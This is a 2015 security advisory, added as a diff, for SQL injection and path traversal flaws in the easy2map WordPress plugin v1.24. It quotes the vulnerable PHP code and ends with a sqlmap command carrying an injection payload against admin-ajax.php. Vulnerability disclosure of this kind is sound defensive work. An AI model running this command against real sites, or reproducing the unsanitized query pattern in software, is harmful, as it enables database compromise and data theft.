@@ -1,0 +1,95 @@
+Title: SQL Injection in easy2map wordpress plugin v1.24
+Author: Larry W. Cashdollar, @_larry0
+Date: 2015-06-08
+Download Site: https://wordpress.org/plugins/easy2map
+Vendor: Steven Ellis
+Vendor Notified: 2015-06-08, fixed in v1.25
+Vendor Contact: https://profiles.wordpress.org/stevenellis/
+Advisory: http://www.vapid.dhs.org/advisory.php?v=131
+Description: The easiest tool available for creating custom & great-looking Google Maps. Add multiple pins and customize maps with drag-and-drop simplicity.
+Vulnerability:
+The following lines in Function.php use sprintf() to format queries being sent to the database, this doesn't provide proper sanitization of user input or
+properly parameterize the query to the database.
+
+90         $wpdb->query(sprintf("UPDATE $mapsTable
+91         SET PolyLines = '%s'
+92         WHERE ID = '%s';", $PolyLines, $mapID));
+
+.
+.
+.
+163             $wpdb->query(sprintf("
+164                 UPDATE $mapsTable
+165                 SET TemplateID = '%s',
+166                     MapName = '%s',
+167                     Settings = '%s',
+168                     LastInvoked = CURRENT_TIMESTAMP,
+169                     CSSValues = '%s',
+170                     CSSValuesList = '%s',
+171                     CSSValuesHeading = '%s',
+172                     MapHTML = '%s',
+173                     IsActive = 1,
+174                     ThemeID = '%s'
+175                 WHERE ID = %s;",
+176                     $Items['mapTemplateName'],
+177                     $Items['mapName'],
+178                     urldecode($Items['mapSettingsXML']),
+179                     urldecode($Items["mapCSSXML"]),
+180                     urldecode($Items["listCSSXML"]),
+181                     urldecode($Items["headingCSSXML"]),
+182                     urldecode($Items["mapHTML"]),
+183                     $Items['mapThemeName'],
+184                     $mapID));
+185         } else {
+186 
+187             //this is a map insert
+188             if (!$wpdb->query(sprintf("
+189             INSERT INTO $mapsTable(
+190                 TemplateID,
+191                 MapName,
+192                 DefaultPinImage,
+193                 Settings,
+194                 LastInvoked,
+195                 PolyLines,
+196                 CSSValues,
+197                 CSSValuesList,
+198                 CSSValuesHeading,
+199                 MapHTML,
+200                 IsActive,
+201                 ThemeID
+202             ) VALUES ('%s', '%s', '%s', '%s', 
+203                     CURRENT_TIMESTAMP, '%s', '%s', '%s', '%s', '%s', 0, '%s');",
+204                     $Items['mapTemplateName'],
+205                     $Items['mapName'], str_replace('index.php', '', easy2map_get_plugin_url('/index.php')) .     "images/map_pins/pins/111.png",
+206                     urldecode($Items['mapSettingsXML']), '',
+207                     urldecode($Items["mapCSSXML"]),
+208                     urldecode($Items["listCSSXML"]),
+209                     urldecode($Items["headingCSSXML"]),
+210                     urldecode($Items["mapHTML"]),
+211                     $Items['mapThemeName']))) 
+.
+.
+267         $wpdb->query(sprintf("
+268             UPDATE $mapsTable
+269             SET MapName = '%s',
+270             LastInvoked = CURRENT_TIMESTAMP,
+271             IsActive = 1
+272             WHERE ID = %s;", $mapName, $mapID));
+
+In MapPinImageSave.php, code isn’t sanitized when creating a directory allowing ../ to create files outside of intended directory:
+
+4 $imagesDirectory = WP_CONTENT_DIR . "/uploads/easy2map/images/map_pins/uploaded/" . $_GET["map_id"] . "/";
+.
+.
+11 if (is_uploaded_file($_FILES["pinicon"]['tmp_name'])) {
+12 
+13     if (!file_exists($imagesDirectory)) {
+14         mkdir($imagesDirectory);
+15     }
+
+CVEID: 2015-4614 (SQLi) 2015-4616 (../ bug)
+OSVDB:
+
+Exploit Code:
+
+  • $ sqlmap -u 'http://wp.site:80/wp-admin/admin-ajax.php' --data="mapID=11&mapName='+or+1%3D%3D1%3B&action=e2m_img_save_map_name" --cookie=COOKIE HERE --level=5 --risk=3
